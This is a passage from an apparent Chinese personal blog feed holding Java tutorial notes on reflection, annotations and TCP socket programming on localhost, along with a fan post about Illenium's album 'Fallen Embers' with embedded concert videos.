ReflectiveOperationException &#123;</span><br><span class="line">      <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">      Class&lt;? <span class="keyword">extends</span> <span class="title class_">Student</span>&gt; aClass = student.getClass();</span><br><span class="line"></span><br><span class="line">      <span class="type">Method</span> <span class="variable">getAge</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000000000</span>; i++) &#123;</span><br><span class="line">         getAge.invoke(student);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">      System.out.println(endTime - startTime);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//反射方式调用 关闭检测</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test03</span><span class="params">()</span> <span class="keyword">throws</span> ReflectiveOperationException &#123;</span><br><span class="line">      <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">      Class&lt;? <span class="keyword">extends</span> <span class="title class_">Student</span>&gt; aClass = student.getClass();</span><br><span class="line"></span><br><span class="line">      <span class="type">Method</span> <span class="variable">getAge</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">      getAge.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">      <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000000000</span>; i++) &#123;</span><br><span class="line">         getAge.invoke(student);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">      System.out.println(endTime - startTime);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ReflectiveOperationException &#123;</span><br><span class="line">      test01();</span><br><span class="line">      test02();</span><br><span class="line">      test03();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-Annotation/speed.JPG"></p><p>普通方式最快。</p><h2 id="反射操作泛型"><a href="#反射操作泛型" class="headerlink" title="反射操作泛型"></a>反射操作泛型</h2><ul><li><code>ParameterizedType</code>：表示一种参数化类型，比如<code>Collection&lt;String&gt;</code>。</li><li><code>GenericArrayType</code>：表示一种元素类型是参数化类型或者类型变量的数组类型。</li><li><code>TypeVariable</code>：是各种类型变量的公共父接口。</li><li><code>WildcardType</code>：代表一种通配符类型表达式。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射获取泛型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflection08</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test01</span><span class="params">(Map&lt;String, Student&gt; map, List&lt;Student&gt; list)</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;test01&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Map&lt;String, Student&gt; <span class="title function_">test02</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;test02&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">      <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> TestReflection08.class.getMethod(<span class="string">&quot;test01&quot;</span>, Map.class, List.class);</span><br><span class="line">      Type[] genericParameterTypes = method.getGenericParameterTypes();</span><br><span class="line">      <span class="keyword">for</span> (Type genericParameterType : genericParameterTypes) &#123;</span><br><span class="line">         System.out.println(genericParameterType);</span><br><span class="line">         <span class="keyword">if</span> (genericParameterType <span class="keyword">instanceof</span> ParameterizedType) &#123; <span class="comment">//是参数化类型</span></span><br><span class="line">            <span class="comment">//强制转换后获取真实参数类型</span></span><br><span class="line">            Type[] actualTypeArguments = ((ParameterizedType) genericParameterType).getActualTypeArguments();</span><br><span class="line">            <span class="keyword">for</span> (Type actualTypeArgument : actualTypeArguments) &#123;</span><br><span class="line">               System.out.println(<span class="string">&quot;- &quot;</span> + actualTypeArgument);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;====================================&quot;</span>);</span><br><span class="line">      method = TestReflection08.class.getMethod(<span class="string">&quot;test02&quot;</span>);</span><br><span class="line">      <span class="type">Type</span> <span class="variable">genericReturnType</span> <span class="operator">=</span> method.getGenericReturnType();</span><br><span class="line">      System.out.println(genericReturnType);</span><br><span class="line">      <span class="keyword">if</span> (genericReturnType <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">         Type[] actualTypeArguments = ((ParameterizedType) genericReturnType).getActualTypeArguments();</span><br><span class="line">         <span class="keyword">for</span> (Type actualTypeArgument : actualTypeArguments) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;- &quot;</span> + actualTypeArgument);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-Annotation/genericType.JPG"></p><h2 id="获取注解信息"><a href="#获取注解信息" class="headerlink" title="获取注解信息"></a>获取注解信息</h2><p><code>getAnnotations</code>和<code>getAnnotation</code>。</p><p>ORM：Object Relationship Mapping，对象关系映射。</p><p>类和表结构对应，属性和字段对应，对象和记录对应。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反射操作注解</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflection09</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line">      Class&lt;?&gt; c1 = Class.forName(<span class="string">&quot;Student2&quot;</span>);</span><br><span class="line">      <span class="comment">//通过反射获得注解</span></span><br><span class="line">      Annotation[] annotations = c1.getAnnotations();</span><br><span class="line">      <span class="keyword">for</span> (Annotation annotation : annotations) &#123;</span><br><span class="line">         System.out.println(annotation);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//获得注解的value值</span></span><br><span class="line">      <span class="type">Tablelf</span> <span class="variable">tablelf</span> <span class="operator">=</span> c1.getAnnotation(Tablelf.class);</span><br><span class="line">      System.out.println(tablelf.value());</span><br><span class="line"></span><br><span class="line">      <span class="comment">//获得指定属性的注解</span></span><br><span class="line">      <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">      <span class="type">Fieldlf</span> <span class="variable">fieldlf</span> <span class="operator">=</span> name.getAnnotation(Fieldlf.class);</span><br><span class="line">      System.out.println(fieldlf.columnName());</span><br><span class="line">      System.out.println(fieldlf.type());</span><br><span class="line">      System.out.println(fieldlf.length());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Tablelf(&quot;db_student&quot;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student2</span> &#123;</span><br><span class="line">   <span class="meta">@Fieldlf(columnName = &quot;db_id&quot;, type = &quot;int&quot;, length = 10)</span></span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">   <span class="meta">@Fieldlf(columnName = &quot;db_age&quot;, type = &quot;int&quot;, length = 10)</span></span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">   <span class="meta">@Fieldlf(columnName = &quot;db_name&quot;, type = &quot;varcher&quot;, length = 3)</span></span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Student2</span><span class="params">(<span class="type">int</span> id, <span class="type">int</span> age, String name)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.id = id;</span><br><span class="line">      <span class="built_in">this</span>.age = age;</span><br><span class="line">      <span class="built_in">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Student2</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> id;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.id = id;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> age;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Student2&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">            <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">            <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类名的注解</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@interface</span> Tablelf &#123;</span><br><span class="line">   String <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//属性的注解</span></span><br><span class="line"><span class="meta">@Target(ElementType.FIELD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@interface</span> Fieldlf &#123;</span><br><span class="line">   String <span class="title function_">columnName</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">   String <span class="title function_">type</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> <span class="title function_">length</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-Annotation/getAnnotation.JPG"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>灰烬—觉醒—翱翔—尘埃落定</title>
      <link href="/2021/07/16/illenium/"/>
      <url>/2021/07/16/illenium/</url>
      
        <content type="html"><![CDATA[<p>凤凰Illenium第四张专辑<strong>《Fallen Embers》</strong>于7月16日发布！共计收录14首单曲，合作艺人包括Excision &#x2F; Said The Sky &#x2F; Dabin &#x2F; Krewella &#x2F; SLANDER &#x2F; Sasha Sloan &#x2F; Annika Wells &#x2F; Nurko &#x2F; HALIENE &#x2F; Lights &#x2F; iann dior等。</p><img src="https://img.lfalive.top/illenium/album.jpg" style="zoom:50%;" /><p>至此，四张个人专辑分别为<strong>《Ashes》《Awake》《Ascend》《Fallen Embers》</strong>。灰烬、觉醒、翱翔、尘埃落定。</p><p>7月3日，Illenium在拉斯维加斯举办了Trilogy专场，表演了前三张专辑的set，还有新专预览。</p><img src="https://img.lfalive.top/illenium/live.jpg" style="zoom:80%;" /><h2 id="全场tracklist"><a href="#全场tracklist" class="headerlink" title="全场tracklist"></a>全场tracklist</h2><p><a href="https://www.1001tracklists.com/tracklist/1fxtyrdk/illenium-trilogy-allegiant-stadium-las-vegas-united-states-2021-07-03.html">Illenium @ Trilogy, Allegiant Stadium Las Vegas, United States 2021-07-03</a></p><h2 id="视频链接"><a href="#视频链接" class="headerlink" title="视频链接"></a>视频链接</h2><p>视频来自B站400大佬。</p><h3 id="Ashes-Set"><a href="#Ashes-Set" class="headerlink" title="Ashes Set"></a>Ashes Set</h3><div style="position:relative; padding-bottom:75%; width:100%; height:0"><iframe src="//player.bilibili.com/player.html?aid=418912337&bvid=BV1fV411p7Wj&cid=364513424&page=2" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"></iframe></div> <h3 id="Awake-Set"><a href="#Awake-Set" class="headerlink" title="Awake Set"></a>Awake Set</h3><div style="position:relative; padding-bottom:75%; width:100%; height:0"><iframe src="//player.bilibili.com/player.html?aid=418912337&bvid=BV1fV411p7Wj&cid=364177551&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"></iframe></div> <h3 id="Ascend-Set-Fallen-Embers-Preview"><a href="#Ascend-Set-Fallen-Embers-Preview" class="headerlink" title="Ascend Set + Fallen Embers Preview"></a>Ascend Set + Fallen Embers Preview</h3><div style="position:relative; padding-bottom:75%; width:100%; height:0"><iframe src="//player.bilibili.com/player.html?aid=418912337&bvid=BV1fV411p7Wj&cid=364223411&page=3" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"></iframe></div> </br><img src="https://img.lfalive.top/illenium/thanks.jpg" style="zoom:80%;" /><h2 id="其他推荐"><a href="#其他推荐" class="headerlink" title="其他推荐"></a>其他推荐</h2><p>一个不知道谁做的Mix：<a href="http://music.163.com/dj?id=2069452812">A Illenium Inspired Mix 2020</a>。最后的Love Story很绝。</p><p>自己收藏的歌单，包括一些凤凰自己的和set表演过的。</p>    <div id="aplayer-SIJJlkee" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="7156990857" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-order="random"    ></div><p>本来想列个人向Top 20的，结果觉得精品太多，选不出来，遂放弃。</p><p>可以肯定的是，<strong>《Good Things Fall Apart vs. Sad Songs》</strong>是我个人的Top 1，情感渐进，带着遗憾又充满希望和力量。当然，两首原曲也很好听。</p>    <div id="aplayer-KUjpqldn" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="001JjLGY04ssxr" data-server="tencent" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"    ></div><blockquote><p>ILLENIUM：凤凰本身的生命循环规律是：从自己的余烬中重生。所以表达的类似是由死而生，或是从失败中重新站起来。我们之前如此聚焦于凤凰的重生阶段，所以现在，我想是时候去诉说其他的阶段。不是死亡，是在重生之前的转换。</p></blockquote><blockquote><p>也许ILLENIUM已不再是曾经那个以无比热烈的声音去给大家展现凤凰于烈焰与灰烬中重生的英姿，予以大家无限震撼与鼓励的“浴火涅槃的凤凰之子”了。 而如今在我们眼前的，是一位以柔情的声音，去给大家讲述生活中的点滴感动，予以大家温暖与治愈的“拥抱世界的凤凰之子”！</p></blockquote><p>最后放几张2019年VAC自己拍的现场照。期待下一次看凤凰Live，最好可以带女朋友去，看完不会分手那种。</p><p><img src="https://img.lfalive.top/illenium/vac1.jpg"></p><p><img src="https://img.lfalive.top/illenium/vac2.jpg" alt="vac2"></p><p><img src="https://img.lfalive.top/illenium/vac3.jpg" alt="vac3"></p><p><img src="https://img.lfalive.top/illenium/vac4.jpg" alt="vac4"></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> music </tag>
            
            <tag> illenium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习笔记(3)——网络编程</title>
      <link href="/2021/07/14/Learn-java-TCP/"/>
      <url>/2021/07/14/Learn-java-TCP/</url>
      
        <content type="html"><![CDATA[<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p><a href="https://www.kuangstudy.com/">狂神说java官网</a></p><p><a href="https://www.bilibili.com/video/BV1LJ411z7vY">B站视频链接</a></p><h1 id="要素"><a href="#要素" class="headerlink" title="要素"></a>要素</h1><ol><li>两个主要的问题：如何准确定位到网络上的一台或多台主机；找到主机之后如何通信。</li><li>网络编程中的要素：IP和端口号；网络通信协议。</li><li>万物皆对象。</li></ol><h1 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h1><ul><li>IP地址：InterAddress，唯一定位一台网络上的计算机。</li><li>127.0.0.1：本机localhost。</li><li>ip地址分类：<ul><li>ipv4 &#x2F; ipv6</li><li>公网（互联网）-私网（局域网）</li></ul></li><li>域名：记忆IP问题</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestIP</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">InetAddress</span> <span class="variable">inetAddress1</span> <span class="operator">=</span> InetAddress.getLocalHost();</span><br><span class="line">         System.out.println(inetAddress1);</span><br><span class="line">         <span class="type">InetAddress</span> <span class="variable">inetAddress2</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">         System.out.println(inetAddress2);</span><br><span class="line">         System.out.println(inetAddress2.getCanonicalHostName());<span class="comment">//规范的名字</span></span><br><span class="line">         System.out.println(inetAddress2.getHostAddress());<span class="comment">//ip</span></span><br><span class="line">         System.out.println(inetAddress2.getHostName());<span class="comment">//域名</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-TCP/TestIP.JPG"></p><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><p>不同的端口有不同的端口号，用来区分软件。</p><p>0-65535被规定。单个协议下，端口号不能冲突。</p><p>端口分类：</p><ul><li>公用端口 0-1023<ul><li>HTTP: 80</li><li>HTTPS: 443</li><li>FTP: 21</li><li>Telent: 23</li></ul></li><li>程序注册端口 1024-49151，分配用户或者程序<ul><li>Tomcat: 8080</li><li>MySQL: 3306</li><li>Oracle: 1521</li></ul></li><li>动态、私有 49152-65535</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -ano <span class="comment">#查看所有端口</span></span><br><span class="line">netstat -ano|findstr <span class="string">&quot;10000&quot;</span> <span class="comment">#查看指定端口</span></span><br><span class="line">tasklist|findstr <span class="string">&quot;10000&quot;</span> <span class="comment">#查看指定端口的进程</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSocket</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">InetSocketAddress</span> <span class="variable">socketAddress</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>);</span><br><span class="line">      <span class="type">InetSocketAddress</span> <span class="variable">socketAddress2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">8080</span>);</span><br><span class="line">      System.out.println(socketAddress);</span><br><span class="line">      System.out.println(socketAddress2);</span><br><span class="line"></span><br><span class="line">      System.out.println(socketAddress.getAddress());</span><br><span class="line">      System.out.println(socketAddress.getHostName()); <span class="comment">//地址</span></span><br><span class="line">      System.out.println(socketAddress.getPort()); <span class="comment">//端口</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-TCP/TestSocket.JPG"></p><h1 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h1><p><strong>网络通信协议</strong>：速率、传输码率、代码结构、传输控制……</p><table><thead><tr><th align="center">TCP用户传输协议</th><th align="center">UDP用户数据报协议</th></tr></thead><tbody><tr><td align="center">连接，稳定</td><td align="center">不连接，不稳定</td></tr><tr><td align="center">客户端、服务端</td><td align="center">没有明确的界限</td></tr><tr><td align="center">三次握手，四次挥手</td><td align="center">不管是否准备好，都可以发</td></tr><tr><td align="center">传输完成，释放连接，效率低</td><td align="center">DDOS攻击、饱和攻击</td></tr></tbody></table><h1 id="TCP实现聊天"><a href="#TCP实现聊天" class="headerlink" title="TCP实现聊天"></a>TCP实现聊天</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//服务端</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TCPServerDemo1</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> (<span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">9999</span>);</span><br><span class="line">           <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">           <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">           <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>()</span><br><span class="line">      ) &#123;</span><br><span class="line">         <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">         <span class="type">int</span> len;</span><br><span class="line">         <span class="keyword">while</span> ((len = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println(baos);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//客户端</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TCPClientDemo1</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">InetAddress</span> <span class="variable">serverIP</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">         socket = <span class="keyword">new</span> <span class="title class_">Socket</span>(serverIP, <span class="number">9999</span>);</span><br><span class="line">         os = socket.getOutputStream();</span><br><span class="line">         os.write(<span class="string">&quot;nb&quot;</span>.getBytes());</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (os != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               os.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (socket != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               socket.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端使用的是比较冗长的写法，将各种资源的<code>close()</code>方法写在<code>finally</code>块中，同时加入各自的<code>catch</code>块。服务端使用的是<a href="https://blog.csdn.net/frgod/article/details/53414813">try-with-resources语句</a>，更简洁。</p><p>如果需要服务端不断监听并收取消息，需使用循环语句改写代码。</p><p><a href="https://www.cnblogs.com/wugongzi/p/12092326.html">Java——IO流超详细总结</a></p><h1 id="TCP实现文件上传"><a href="#TCP实现文件上传" class="headerlink" title="TCP实现文件上传"></a>TCP实现文件上传</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//服务端</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TCPServerDemo2</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> (<span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">9000</span>);</span><br><span class="line">           <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> serverSocket.accept(); <span class="comment">//阻塞式监听</span></span><br><span class="line">           <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">           <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">           <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;receive.jpg&quot;</span>)) &#123;</span><br><span class="line">         <span class="comment">//接收文件</span></span><br><span class="line">         <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">         <span class="type">int</span> len;</span><br><span class="line">         <span class="keyword">while</span> ((len = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            fos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">         &#125;</span><br><span class="line">         os.write(<span class="string">&quot;Received&quot;</span>.getBytes()); <span class="comment">//通知客户端已接收完毕</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//客户端</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TCPClientDemo2</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> (<span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>), <span class="number">9000</span>);</span><br><span class="line">           <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">           <span 